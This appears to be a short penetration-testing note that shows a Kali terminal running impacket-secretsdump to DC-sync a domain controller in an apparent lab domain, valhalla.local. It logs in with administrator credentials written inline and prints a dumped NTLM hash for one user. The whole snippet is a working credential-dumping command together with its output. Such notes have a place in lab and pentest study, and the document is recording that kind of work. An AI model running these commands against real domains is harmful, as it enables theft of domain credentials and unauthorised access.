### impacket - Secretsdump

	┌──(kali㉿kali)-[~]
	└─$ /usr/bin/impacket-secretsdump -just-dc-ntlm valhalla.local/administrator:Pass123\!@valhalla.local -just-dc-user testuser
	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

	[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
	[*] Using the DRSUAPI method to get NTDS.DIT secrets
	valhalla.local\testuser:2117:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
	[*] Cleaning up... 
